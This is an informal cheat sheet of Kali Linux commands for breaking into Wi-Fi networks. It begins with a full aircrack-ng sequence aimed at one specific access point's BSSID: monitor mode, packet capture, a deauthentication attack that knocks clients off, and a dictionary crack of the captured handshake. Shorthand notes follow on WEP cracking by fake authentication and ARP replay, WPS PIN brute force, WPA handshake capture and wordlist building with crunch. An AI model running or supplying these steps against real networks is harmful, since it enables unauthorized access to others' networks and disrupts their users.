ifconfig
airmon-ng check kill
airmon-ng start wlan0
airodump-ng wlan0mon
airodump-ng -c 1 --bssid 80:35:C1:13:C1:2C -w /root wlan0mon
aireplay-ng -0 10 -a 80:35:C1:13:C1:2C wlan0mon
aircrack-ng -a2 -b 80:35:C1:13:C1:2C -w /root/passwords.txt /root/hacking-01.cap

''' Ifconfig    // To check if your wireless adapter is connected to your kali //

=>Airmon-ng start wlan0   // Now put your wlan0 card from managed mode to monitor mode//

___WEP___ 

**If its a busy network**
A) airodump-ng --bssid --channel --write basic filename wlan0/mon0
B) Now we just perform aircrack-ng basic filename
C) Now u found key after sometime use granny(application) that connects wifi

**If its not a busy network**
(we will make it busy by sending packet)
A) Fake authentication( by aireplay-ng)
B) Then we use arpreplay to network
C) Then same we do aircrack-ng nd get the KEY

___WPA/WPA2___

**If WPS is enabled** then we can connect to the network by brute force because
authetication is 8digit long pin

If WPS is not enabled then we need two things
a)capture the handshake
b)creating a wordlist

A) Capturing the Handshake   //Now to capture the Handshake we have to perform deauthentication attack because
everytime the device gets connected the new handshake packet is sent //

airodump-ng --bssid --channel --write test-handshake  // will show #/s=0//

after deauthentication

aireplay-ng --deauth  -a bssid -c station mon0/wlan0    // will show #/s=1 //

B) Creating A wordlist : you can download wordlist online or u can create
your own its actually a list of password you can guess for creating your own wordlsit
you can take help of tool called CRUNCH.

Crunch[min][max][characters=lower|upper|numbers|sysmbols| -t[pattern] -o[file]

NOW we perform aircrack-ng

aircrack-ng test-handshake-01.cap -w wpa-wordlist  // KEY FOUND //   '''





















